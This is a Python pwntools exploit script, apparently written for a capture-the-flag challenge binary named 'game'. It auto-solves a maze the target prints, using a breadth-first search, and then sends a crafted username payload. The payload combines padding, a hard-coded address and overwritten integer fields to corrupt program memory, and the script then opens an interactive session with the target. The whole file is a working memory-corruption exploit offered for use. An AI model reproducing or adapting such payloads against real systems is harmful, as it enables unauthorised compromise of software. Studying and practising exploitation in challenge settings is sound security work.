#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./game')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x403431
				c
				set $rip = 0x403433
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('localhost', 15000)

	return s

lines, row, col = [], 0, 0
d1 = [0, -1, 1, 0]
d2 = [-1, 0, 0, 1]
back = ['A', 'W', 'S', 'D']

def valid(row, col):
	return row >= 0 and row < 20 and col >= 0 and col < 20 and lines[row][col] != '#'

def find_first_star():
	global lines, row, col, d1, d2, back

	print('Find first star from [' + str(row) + ', ' + str(col) + ']')

	tmp = [[5 for i in range(20)] for j in range(20)]
	tmp[row][col] = 4
	que = [[row, col]]

	for i in que:
		for j in range(4):
			new_row = i[0] + d1[j]
			new_col = i[1] + d2[j]
			if (valid(new_row, new_col)):
				if tmp[new_row][new_col] == 5:
					tmp[new_row][new_col] = j
					if lines[new_row][new_col] == '*':
						for _ in tmp:
							print(_)
						row = new_row
						col = new_col
						lines[row][col] = '.'
						way = ''
						z = tmp[new_row][new_col]
						while z != 4:
							way += back[z]
							new_row -= d1[z]
							new_col -= d2[z]
							z = tmp[new_row][new_col]
						print(way[::-1])
						return way[::-1]
					else:
						que.append([new_row, new_col])
	return ''

def autosolve():
	ans = ''
	for _ in range(5):
		ans += find_first_star()
	return ans

s = conn()

elf = ELF('game')

s.sendlineafter(b'2. Exit', b'1')

if debug:
	s.sendlineafter(b'Input move: ', b'D')
else:
	s.recvuntil(b'It is on beta version, sorry if sometime you cannot play T^T\n')
	log.info('Get map from server')
	lines = []
	for i in range(20):
		lines.append(s.recvline().decode().strip().split(' '))
	for i in lines:
		print(i)
	move = autosolve()
	log.info('Send move: %s', move)
	s.sendlineafter(b'Input move: ', move.encode())

payload = b'My name is Cobra' + b'\x00' * 16 + p64(0) * 14 + p64(0x40C480) + p64(16) + p64(0) * 2 + p32(1) + p32(2000)
s.sendlineafter(b'Input your username: ', payload)

s.interactive()
